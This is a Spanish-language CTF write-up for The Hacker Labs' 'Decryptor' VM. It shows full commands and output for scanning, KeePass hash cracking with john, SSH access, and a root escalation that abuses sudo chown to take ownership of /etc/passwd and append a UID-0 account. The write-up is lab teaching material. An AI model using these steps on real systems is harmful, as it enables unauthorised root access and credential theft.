---
title: CTF-Decryptor
description: Guia en texto del CTF Fruits de The hacker Labs, incluye enumeración de puertos, tecnicas de recopilación de información, acceso y escalamiento de privilegios.
date: 2024-08-04 00:57 +/-TTTT
categories: [ES-CTF, The Hacker Labs]
tags: [hacking, tehhackerlabs, ctf, es, Principiante]     # TAG names should always be lowercase
pin: true
math: true
mermaid: true
image:
  path: https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/portada.jpg?raw=true
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
---
**Guía en Texto del CTF Decryptor de The Hacker Labs**

Esta guía incluye la enumeración de puertos, técnicas de recopilación de información, acceso, y escalamiento de privilegios.

<!---Indice-->
**Índice**

**Índice**

1.[Decryptor](#1-decryptor)

1.1 [Detalles de la máquina virtual](#11-detalles-de-la-máquina-virtual)

2.[Reconocimiento](#2-reconocimiento)

2.1 [Conectividad](#21-conectividad)

2.2 [Reconocimiento de vulnerabilidades con Nmap](#22-reconocimiento-de-vulnerabilidades-con-nmap)

2.3 [Visualización de sitio web](#23-visualización-de-sitio-web)

3.[Recopilación de Información](#3-recopilación-de-información)

3.1 [Consulta al sitio web](#31-consulta-al-sitio-web)

3.2 [Decodificación de Brainfuck](#32-decodificación-de-brainfuck)

3.3 [Acceso al servicio FTP](#33-acceso-al-servicio-ftp)

3.4 [Rompiendo el hash de User.kdbx](#34-rompiendo-el-hash-de-userkdbx)

4.[Conseguir Acceso](#4-conseguir-acceso)

4.1 [Accediendo al Keepass](#41-accediendo-al-keepass)

4.2 [Accesso SSH](#42-acceso-ssh)

5.[Escalamiento de privilegios](#5-escalamiento-de-privilegios)

6.[Observaciones y recomendaciones](#6-observaciones-y-recomendaciones)


<!-- Inicio del documento -->

## 1. Decryptor

### 1.1 Detalles de la máquina virtual

**Decryptor** es una máquina virtual proporcionada por la plataforma web de CTFs ***The Hacker Labs**. Agradecemos su contribución y apoyo a la comunidad, lo cual nos permite seguir creciendo y aprendiendo sobre este apasionante mundo de la ciberseguridad. **Visitalos:** [The Hacker Labs](https://thehackerslabs.com "the hacker labs")

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/1.jpg?raw=true "decryptor logo")

Después de descargar la máquina virtual, obtendrás un archivo .ova. Al ejecutarlo, este archivo desplegará la máquina virtual en VMware o VirtualBox, y se le asignará automáticamente una dirección IP de la red en la que estás trabajando.

| Vm name       | Ip Adress     | Creators  | Level  |
| :-----------: |:-------------:| :--------:|
| Decryptor        | `192.168.1.24`  | The Hacker Labs     | Principiante     |

## 2. Reconocimiento

### 2.1 Conectividad

Lo primero que debemos hacer es verificar si tenemos acceso al escenario. Para ello, validamos la conectividad hacia el objetivo desde nuestra máquina virtual. Una vez confirmado el acceso, podemos iniciar las pruebas de ethical hacking.


```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# ping 192.168.1.24 -c 1
PING 192.168.1.24 (192.168.1.24) 56(84) bytes of data.
64 bytes from 192.168.1.24: icmp_seq=1 ttl=64 time=0.512 ms

--- 192.168.1.24 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.512/0.512/0.512/0.000 ms
```

### 2.2 Reconocimiento de vulnerabilidades con Nmap

Se utiliza Nmap para recopilar información que pueda ser usada posteriormente en un ataque. En nuestra búsqueda, tratamos de identificar las versiones de servicio y el sistema operativo. El comando utilizado fue `nmap -sVC 192.168.1.24`. Como resultado, observamos que el objetivo tiene los siguientes puertos abiertos: `22`, `80` y `2121`.

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# nmap -sVC 192.168.1.24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 20:15 EDT
Nmap scan report for 192.168.1.24
Host is up (0.0081s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 01:86:f3:c5:03:b3:27:0e:47:8e:e9:2e:41:3f:b8:40 (ECDSA)
|_  256 5b:0c:8c:d1:16:99:16:90:59:c7:03:fe:21:67:1b:10 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
2121/tcp open  ftp     vsftpd 3.0.3
MAC Address: 00:0C:29:40:B3:57 (VMware)
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
```

### 2.3 Visualización de sitio web

Vamos a revisar el sitio web que nos proporciona el objetivo para identificar elementos que puedan llamarnos la atención y así abordar el reto de manera efectiva.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/2.jpg?raw=true "consulta web")

## 3. Recopilación de Información

### 3.1 Consulta al sitio web

La página web nos muestra el sitio por defecto de Apache. A simple vista, no se observan detalles significativos, pero como buena práctica, siempre se revisa el código HTML del sitio web.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/3.jpg?raw=true "consulta html")

A simple vista, todo parece estar en orden, pero continuemos revisando para asegurarnos de no pasar por alto ningún detalle.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/4.jpg?raw=true "código brainfuck")

Observamos una línea que, por su estructura, parece ser un código en **Brainfuck**.

### 3.2 Decodificación de Brainfuck

En internet, podemos encontrar muchos decodificadores de Brainfuck. Selecciona el que prefieras y procede a identificar el mensaje oculto en este código.

En este caso utilizare este **Decoder:** [Brainfuck Traslator](https://md5decrypt.net/en/Brainfuck-translator/ "Brainfuck traslator")

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/5.jpg?raw=true "comentario html brainfuck")

Recuerda que para colocar un comentario en Html se usa "<(!)--- --->" por lo tanto debes eliminarlo para que no altere el mensaje del código Brainfuck.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/6.jpg?raw=true "Decoder")

observamos la frase:

`marioeatslettuce`

Podríamos intentar con el servicio FTP que detectamos en el servidor objetivo.


### 3.3 Acceso al servicio FTP

Al probar con la frase obtenida, descubrimos que nos brinda acceso si la utilizamos de esta manera:

user: mario
password: marioeatslettuce

```bash
┌──(root㉿V4lcyfer)-[/home/kali]
└─# ftp 192.168.1.24 -p 2121
Connected to 192.168.1.24.
220 (vsFTPd 3.0.3)
Name (192.168.1.24:kali): mario
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Validamos lo que encontramos dentro del FTP y descubrimos un archivo `user.kdbx`. Lo extraemos para poder analizarlo.

```bash
ftp> dir
229 Entering Extended Passive Mode (|||39266|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1390 May 21 07:50 user.kdbx
226 Directory send OK.
ftp> get user.kdbx
local: user.kdbx remote: user.kdbx
229 Entering Extended Passive Mode (|||22445|)
150 Opening BINARY mode data connection for user.kdbx (1390 bytes).
100% |*************************************************************|  1390      435.34 KiB/s    00:00 ETA
226 Transfer complete.
1390 bytes received in 00:00 (285.77 KiB/s)
ftp> 
```
Con el archivo user.kdbx ya descargado, podemos identificar por la extensión que se trata de un archivo de KeePass. Sin embargo, está protegido por contraseña.

### 3.4 Rompiendo el hash de User.kdbx

- keepass2john: Es una herramienta utilizada para convertir archivos de bases de datos de contraseñas de KeePass (con extensión .kdbx) en un formato que puede ser procesado por herramientas de recuperación de contraseñas, como John the Ripper.

```bash                                                                                                
┌──(root㉿kali)-[/home/kali]
└─# keepass2john user.kdbx >> userhash.txt
┌──(root㉿kali)-[/home/kali]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt userhash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 1 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (user)     
1g 0:00:00:01 DONE (2024-08-05 22:52) 0.8695g/s 47805p/s 47805c/s 47805C/s nando1..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.                                                                                             
```

Obtenemos la contraseña de la base de datos de contraseñas de KeePass `moonshine1`.

## 4. Conseguir Acceso

### 4.1 Accediendo al Keepass

Para esto, primero instalamos una versión minimal de KeePass. Luego, podemos ejecutarla señalando la base de datos obtenida (user.kdbx).

```bash
┌──(root㉿kali)-[/home/kali]
└─# keepassxc user.kdbx          
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
error: XDG_RUNTIME_DIR is invalid or not set in the environment.
MESA: error: ZINK: failed to choose pdev
glx: failed to create drisw screen
failed to load driver: zink
```

Accedemos con la contraseña obtenida.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/7.jpg?raw=true "Keepass password")

Una vez dentro observamos que tiene solo un registro guardado, observemos.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/8.jpg?raw=true "Keepass account")

Bingo!, tenemos las credenciales.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/9.jpg?raw=true "user and password")

Ahora accederemos al servidor objetivo.

`usuario: chiquero`
`contraseña: barcelona2012`

### 4.2 Acceso SSH

Probamos el acceso `ssh chiquero@192.168.1.24`

```bash
┌──(root㉿kali)-[/home/kali]
└─# ssh chiquero@192.168.1.24
chiquero@192.168.1.24's password: 
Linux Decryptor 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 21 07:52:17 2024 from 192.168.1.35
chiquero@Decryptor:~$ 
```

Ya dentro del servidor buscamos la primera flag la cual no se encuentra dentro del usuario chiquero, si no dentro del usuario mario, tenemos que navegar un pooco entre los directorios para poder ubicar el archivo.

```bash
chiquero@Decryptor:~$ ls -la
total 20
drwxr-xr-x 2 chiquero chiquero 4096 Jun  7 13:24 .
drwxr-xr-x 4 root     root     4096 May 21 07:18 ..
lrwxrwxrwx 1 root     root        9 Jun  7 13:24 .bash_history -> /dev/null
-rw-r--r-- 1 chiquero chiquero  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 chiquero chiquero 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 chiquero chiquero  807 Apr 23  2023 .profile
chiquero@Decryptor:~$ pwd
/home/chiquero
chiquero@Decryptor:~$ cd ..
chiquero@Decryptor:/home$ ls
chiquero  mario
chiquero@Decryptor:/home$ cd mario
chiquero@Decryptor:/home/mario$ ls
ftp  user.txt
chiquero@Decryptor:/home/mario$ cat user.txt 
sfds5gf6sfdcdafsd5a7sdcydsf58
chiquero@Decryptor:/home/mario$ 
```
user flag:  `sfds5gf6sfdcdafsd5a7sdcydsf58`

## 5. Escalamiento de privilegios

Para obtener la segunda flag, necesitamos ser usuario root. Para esto, verificamos qué comandos podemos ejecutar como root.

```bash
chiquero@Decryptor:/home/mario$ sudo -l
Matching Defaults entries for chiquero on Decryptor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User chiquero may run the following commands on Decryptor:
    (ALL) NOPASSWD: /usr/bin/chown
chiquero@Decryptor:/home/mario$ 
```

Observamos que podemos ejecutar el comando chown como root. Ahora debemos investigar si es posible obtener una shell con privilegios de root utilizando este comando, siguiendo algunos parámetros específicos.

Para esto, nos ayudaremos de la siempre confiable [Gtfobins](https://gtfobins.github.io/gtfobins/node/ "gtfobins"), donde buscaremos lo que necesitamos en su amplio catálogo de binarios. Este excelente sitio web nos proporciona una variedad de binarios útiles para nuestras necesidades.

![imagen.](https://github.com/V4lcyfer/blog-images/blob/main/HackerLabs/Decryptor/10.jpg?raw=true "user and password")


okey okey tranquilo.

><span style="color:Cyan">! Importante: Alto en Teoría </span>
>
><span style="color:Cyan">Si la rompes en Linux, puedes adelantarte hasta la parte de la escalada de privilegios directamente </span> 

Primero, entendamos qué hace el comando chown. En Linux, el comando chown se utiliza para cambiar el propietario y/o el grupo de archivos o directorios. Su nombre proviene de "change owner" (cambiar propietario). Este comando es muy útil para administrar permisos y asegurar que los usuarios correctos tengan acceso a los archivos necesarios.

La sintaxis basica de chown es algo asi:

```bash
v4lcyfer# chown [opciones] propietario[:grupo] archivo(s)
```
en el cual:

* **opciones** : son las opciones del propio comando, si deseas mas info puedes consultar el manual de chown el cual te lo dejo por acá [Manual de Chown](https://linux.die.net/man/1/chown "chown").
* **Propietario** : Es el nuevo propietario del archivo o directorio, ojo! "archivo o directorio".
* **Grupo** : Este parámetro es opcional es el nuevo grupo al que se debe asignar el archivo o directorio.
* **Archivo** : El archivo o directorio al que se aplican los cambios.

Un ejecución normal de `chown` se veria asi:
Para cambiar el propietario de un archivo llamado archivo.txt a un usuario llamado usuario1.

```bash
v4lcyfer# chown usuario1 archivo.txt
```

Ahora el nuevo propietario de archivo.txt es usuario1.

Con esto claro, vamos a la interpretación de lo que nos muestra gtfobins.

```bash
LFILE=file_to_change
sudo chown $(id -un):$(id -gn) $LFILE
```

Observamos que la primera línea define una variable llamada `LFILE`, que contiene el nombre del archivo o directorio que se desea cambiar. En este caso, la variable se asigna al valor `file_to_change`.

La segunda línea utiliza el poderoso comando `chown` para cambiar el propietario y el grupo del archivo especificado enla variable definida `LFILE` al usuario y grupo actuales que definas. Esto se realiza utilizando sudo para obtener los privilegios necesarios.

Entonces, pensemos en cómo podemos aprovechar esto para escalar privilegios... 🤔

Okey, ¿Y si cambiamos el propietario de un archivo importante del sistema operativo, de manera que el usuario al que tenemos acceso, `chiquero`, sea el nuevo propietario? Esto permitiría que `chiquero` edite el contenido del archivo, lo que podría incluir cambiar la contraseña de root o, aún más interesante, crear un usuario con permisos de root.

para este caso nos serviria mucho el archivo `/etc/passwd`, este imoortante archivo pesar de que el nombre sugiere que podría contener contraseñas, en realidad no lo hace. En cambio, este archivo almacena información sobre las cuentas de usuario del sistema, incluyendo el de `root`.

Dentro del archivo podemos encontrar lineas de información de los usuarios del sistema de la siguiente forma:

```bash
chiquero:x:1001:1001:Chiquero User:/home/chiquero:/bin/bash
```
Es importante entender cómo se interpreta esta línea, así que vamos a detallarla un poco.

* **chiquero:** Nombre del usuario.
* **x:** Indicador de que la contraseña está en /etc/shadow.
* **1001:** UID del usuario chiquero.
* **1001:** GID del grupo principal de chiquero.
* **Chiquero User:** Información adicional sobre el usuario.
* **/home/chiquero:** Directorio personal del usuario.
* **/bin/bash:** Intérprete de comandos utilizado por el usuario.

Ahora con esto super claro, observemos la linea de root.

```bash
root:x:0:0:root:/root:/usr/bin/zsh
```
El UID y GID de root es 0.

Entonces con acceso de escritura a /etc/passwd, el usuario `chiquero` podría añadir una nueva cuenta de usuario con privilegios de `root` solo agregando una nueva entrada al final del archivo para crear una cuenta de usuario con UID 0, que es el UID de `root`.

Vamos a hacerlo!!!

><span style="color:Cyan">! Escalada de Privilegios </span>

Vamos a cambiar de propietario el archivo ``/etc/passwd` para que sea nuestro usuario chiquero.

```bash
chiquero@Decryptor:/home/mario$ who
chiquero pts/0        2024-08-06 00:02 (192.168.1.11)
chiquero@Decryptor:/home/mario$ sudo /usr/bin/chown chiquero /etc/passwd
chiquero@Decryptor:/home/mario$ ls -la /etc/passwd
-rw-r--r-- 1 chiquero root 1290 May 21 07:56 /etc/passwd
```
Ahora podemos crear un usuario con permisos de root, pero necesitamos una contraseña cifrada para este usuario. Debemos generarla, ya que no puede ser en texto plano. Para esto, utilizaremos el comando `openssl`.`

```bash
chiquero@Decryptor:/home/mario$ openssl passwd goku123
$1$V3UaTZN4$SISwXiYffpXFLh8OJTqIu.
chiquero@Decryptor:/home/mario$ 
```
Utilizaremos la clave mas segura del mundo `goku123` y creamos el usuario `goku`.

```bash
chiquero@Decryptor:/home/mario$ echo 'goku:$1$V3UaTZN4$SISwXiYffpXFLh8OJTqIu.:0:0::/home/goku:/bin/bash' >> /etc/passwd
chiquero@Decryptor:/home/mario$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
debian:x:1000:1000:debian,,,:/home/debian:/usr/sbin/nologin
ftp:x:102:110:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
mario:x:1001:1001::/home/mario:/bin/bash
chiquero:x:1002:1002::/home/chiquero:/bin/bash
goku:$1$V3UaTZN4$SISwXiYffpXFLh8OJTqIu.:0:0::/home/goku:/bin/bash
chiquero@Decryptor:/home/mario$ 
```
Òbservamos en la penultima linea que el usuario `goku` se creo exitosamente y con el UID y GUID de `root`.

Accedemos al usario mas poderoso de todos `goku` y validamos si es cierto.

```bash
hiquero@Decryptor:/home/mario$ su goku
Password: 

root@Decryptor:/home/mario# whoami
root
root@Decryptor:/home/mario# 
```

Bingo!, Somos `root`

### 5.1 Flag de root

Buscamos la flag de `root` para asi terminar este reto, que no estan complicado pero tiene muchas cositas que repasar.

```bash
root@Decryptor:/home/mario# cd /root/
root@Decryptor:/root# ls
root.txt
root@Decryptor:/root# cat root.txt 
84c853bhfs5gsdfvsf4dasbsrha3a
root@Decryptor:/root# 

```

root flag: `84c853bhfs5gsdfvsf4dasbsrha3a`

## 6. Observaciones y Recomendaciones

* Siempre es bueno repasar un poco de teoría para tener claros algunos conceptos y entender lo que estamos haciendo y ejecutando. Por más fácil que parezca un reto, siempre tiene un valor de aprendizaje significativo, dependiendo de tu perspectiva. Como me dijo un gerente en un trabajo anterior: "No es parecer, es ser".

* Nunca olvidar el secreto esta en los detalles, siempre observadores, siempre atentos.

* Siempre el agradecimiento a [The Hacker Labs](https://thehackerslabs.com "the hacker labs") por el esfuerzo que hacen en la plataforma para que la comunidad pueda seguir aprendiendo en escenarios seguros.

Saludos!

**!Hack the life!**